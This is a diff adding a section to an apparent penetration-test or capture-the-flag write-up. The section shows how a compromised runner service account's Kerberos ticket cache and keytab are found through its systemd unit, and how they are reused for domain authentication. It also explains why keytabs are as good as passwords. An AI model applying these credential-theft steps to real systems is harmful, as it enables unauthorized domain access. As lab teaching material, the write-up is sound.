@@ -3192,6 +3192,109 @@ Cache contents are the unpacked source tree of `actions/setup-node` (`src/setup-
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.3 — Recover Kerberos credentials from the runner service configuration
+
+`svc-runner` has no ticket in its login credential cache and its password is unknown. The systemd unit that launches the runner must authenticate it to the domain somehow; inspecting the unit reveals how.
+
+**Commands:**
+
+```bash
+systemctl cat gitea-runner
+```
+
+```bash
+ls -la /tmp/krb5cc_gitea /etc/gitea-runner/
+```
+
+```bash
+export KRB5CCNAME=/tmp/krb5cc_gitea
+klist
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`systemctl cat <unit>`|Print a service unit's full definition|Show exactly how the service is configured to start|
+|`KRB5CCNAME`|Environment variable naming the Kerberos credential cache|Tells Kerberos tools which ticket file to use|
+|`kinit -kt <keytab> <principal>`|Obtain a TGT using a keytab instead of a password|Log in to the domain with a key file|
+|`klist`|List tickets in the cache|Show what credentials are held|
+
+**Result — service unit:**
+
+ini
+
+```ini
+# /etc/systemd/system/gitea-runner.service
+[Unit]
+Description=Gitea Act Runner
+After=network.target sssd.service
+Requires=sssd.service
+
+[Service]
+Type=simple
+User=darkzero-ext\svc-runner
+WorkingDirectory=/opt/gitea-runner
+Environment=KRB5CCNAME=/tmp/krb5cc_gitea
+Environment=HOME=/opt/gitea-runner
+ExecStartPre=/usr/bin/kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
+ExecStart=/opt/gitea-runner/act_runner daemon --config /opt/gitea-runner/config.yaml
+Restart=always
+```
+
+**Result — file permissions:**
+
+```
+-rw------- 1 svc-runner domain users 1584 Jul 29 04:57 /tmp/krb5cc_gitea
+
+/etc/gitea-runner/:
+-rw-------   1 svc-runner root    79 May 20 23:33 svc-runner.keytab
+```
+
+**Result — ticket cache:**
+
+```
+Ticket cache: FILE:/tmp/krb5cc_gitea
+Default principal: svc-runner@DARKZERO.EXT
+
+Valid starting       Expires              Service principal
+07/29/2026 04:57:17  07/29/2026 14:57:17  krbtgt/DARKZERO.EXT@DARKZERO.EXT
+        renew until 08/05/2026 04:57:17
+```
+
+**What this gives you:** Full domain authentication as `svc-runner`, both immediately and renewably.
+
+**Key findings:**
+
+- **A valid TGT for `svc-runner@DARKZERO.EXT` exists at `/tmp/krb5cc_gitea`**, written by the running service and owned by `svc-runner`. Setting `KRB5CCNAME` to that path grants domain authentication with no password.
+- **The keytab at `/etc/gitea-runner/svc-runner.keytab` is readable** — owned by `svc-runner`, mode `0600`. This is the stronger credential: a keytab holds the account's long-term key, so fresh tickets can be minted at any time via `kinit -kt`. Ticket expiry at 14:57 is therefore not a constraint.
+- The service unit is the disclosure. It names the keytab path, the principal, and the cache location in plaintext, readable by any local user since `/etc/systemd/system/gitea-runner.service` is world-readable.
+- `Requires=sssd.service` confirms SSSD handles domain integration, consistent with the ID-mapped UIDs observed in 3.24.
+- `User=darkzero-ext\svc-runner` shows systemd launching the service directly as a domain principal.
+- **Dead end:** `/home/svc-runner/.bash_history` is symlinked to `/dev/null`, so no command history is recoverable.
+
+##### 4.3.1 Theory — Keytabs, and why they are equivalent to passwords
+
+A keytab ("key table") is a file holding one or more Kerberos principals alongside their long-term secret keys — the keys derived from the account's password.
+
+Their purpose is unattended authentication. A service starting at boot cannot type a password, so it reads a key from a keytab and presents that to the KDC instead. `kinit -kt /path/to.keytab principal` performs exactly this exchange and deposits a TGT in the credential cache.
+
+The security consequence is direct: **a readable keytab is equivalent to knowing the account's password.** Anyone able to read the file can obtain tickets as that principal, indefinitely, until the account's password changes and the keytab is regenerated. Unlike a ticket, which expires in hours, a keytab remains valid for as long as the key does.
+
+This is why keytabs are conventionally `0600` and owned by the service account — which this one is. The flaw is not the file's permissions; it is that `svc-runner` was compromised through an unrelated path, and the keytab was then simply readable by the account it belonged to.
+
+Two credentials are now available and worth distinguishing. The ticket cache is convenient but expires at 14:57. The keytab is durable and can regenerate tickets on demand. Prefer the keytab for any long-running work.
+
+**Next:** Authenticate to LDAP with the recovered ticket and enumerate the permissions granted by the `servicehandler` group.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
